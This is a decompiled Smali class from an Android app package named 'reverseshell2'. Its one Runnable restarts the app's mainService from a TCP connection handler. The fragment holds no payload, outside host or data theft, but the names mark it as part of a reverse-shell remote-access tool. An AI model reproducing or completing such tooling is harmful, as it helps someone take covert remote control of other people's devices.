.class Lcom/example/reverseshell2/tcpConnection$6;
.super Ljava/lang/Object;
.source "tcpConnection.java"

# interfaces
.implements Ljava/lang/Runnable;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/example/reverseshell2/tcpConnection;->doInBackground([Ljava/lang/String;)Ljava/lang/Void;
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic this$0:Lcom/example/reverseshell2/tcpConnection;


# direct methods
.method constructor <init>(Lcom/example/reverseshell2/tcpConnection;)V
    .locals 0
    .param p1, "this$0"    # Lcom/example/reverseshell2/tcpConnection;

    .line 294
    iput-object p1, p0, Lcom/example/reverseshell2/tcpConnection$6;->this$0:Lcom/example/reverseshell2/tcpConnection;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 4

    .line 297
    iget-object v0, p0, Lcom/example/reverseshell2/tcpConnection$6;->this$0:Lcom/example/reverseshell2/tcpConnection;

    iget-object v0, v0, Lcom/example/reverseshell2/tcpConnection;->context:Landroid/content/Context;

    new-instance v1, Landroid/content/Intent;

    iget-object v2, p0, Lcom/example/reverseshell2/tcpConnection$6;->this$0:Lcom/example/reverseshell2/tcpConnection;

    iget-object v2, v2, Lcom/example/reverseshell2/tcpConnection;->context:Landroid/content/Context;

    const-class v3, Lcom/example/reverseshell2/mainService;

    invoke-direct {v1, v2, v3}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {v0, v1}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    .line 298
    return-void
.end method
